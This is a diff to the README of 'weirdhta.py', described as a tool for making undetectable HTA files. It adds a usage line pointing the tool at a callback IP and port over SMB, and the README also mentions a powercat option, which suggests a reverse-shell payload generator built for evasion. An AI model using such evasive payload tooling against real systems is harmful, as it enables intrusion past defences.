@@ -4,7 +4,7 @@ A Python-based basic tool for creating undetectable hta file.
 
 ```
 python3 weirdhta.py 10.10.10.10 4444
-or
+python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)
 python3 weirdhta.py 10.10.10.10 4444 --nc (for powercat)
 ```
 
@@ -22,3 +22,7 @@ Running via browser:
 Running via cli:
 
 ![](https://i.imgur.com/xYfALz2.gif)
+
+smb:
+![Script Image](https://i.imgur.com/UVgKzpo.png)
+![](https://i.imgur.com/4orNAgX.gif)
